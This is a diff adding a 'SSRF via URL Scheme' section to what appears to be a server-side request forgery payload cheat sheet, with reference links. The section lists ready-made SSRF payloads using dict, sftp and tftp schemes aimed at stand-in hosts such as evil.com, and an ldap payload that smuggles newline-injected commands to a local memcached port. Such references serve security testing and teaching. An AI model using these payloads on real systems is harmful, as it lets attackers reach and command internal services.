@@ -71,7 +71,33 @@ requests + browsers : 2.2.2.2
 urllib : 3.3.3.3
 ```
 
+## SSRF via URL Scheme
+Dict://   
+The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+```
+dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
+ssrf.php?url=dict://attacker:11111/
+```
+
+Sftp://
+```
+ssrf.php?url=sftp://evil.com:11111/
+```
+
+Tftp://
+```
+ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
+```
+
+Ldap://
+```
+ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
+```
+
+
 ## Thanks to
 * [Hackerone - How To: Server-Side Request Forgery (SSRF)](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
 * [Awesome URL abuse for SSRF by @orange_8361 #BHUSA](https://twitter.com/albinowax/status/890725759861403648)
 * [How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE! Orange Tsai](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)
+* [SSRF Tips - xl7dev](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)
+* [SSRF in https://imgur.com/vidgif/url](https://hackerone.com/reports/115748)
